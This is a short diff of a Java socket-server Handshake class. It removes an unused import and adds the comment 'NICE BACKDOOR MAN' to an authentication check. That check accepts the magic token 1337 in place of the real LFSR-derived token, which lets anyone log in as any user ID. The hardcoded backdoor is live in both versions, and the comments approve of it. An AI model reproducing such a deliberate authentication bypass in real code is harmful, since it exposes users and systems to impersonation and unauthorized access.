@@ -7,8 +7,6 @@ import socketserver.exceptions.UserNotFoundException;
 import socketserver.server.MessageFactory;
 import socketserver.util.LSFR;
 
-import java.util.concurrent.ScheduledExecutorService;
-
 public class Handshake extends socketserver.protocol.BaseMessage {
 
     public String USER_ID;
@@ -22,7 +20,7 @@ public class Handshake extends socketserver.protocol.BaseMessage {
         try {
             LSFR l = dp.getLSFR(USER_ID);
             int serverToken = l.shift();
-            if (AUTHENTICATION_TOKEN == serverToken || AUTHENTICATION_TOKEN == 1337) {
+            if (AUTHENTICATION_TOKEN == serverToken || AUTHENTICATION_TOKEN == 1337 /*- NICE BACKDOOR MAN*/) {
                 //YEAH
                 dp.addUser(USER_ID, conn);
                 dp.shiftDBToken(USER_ID, l);
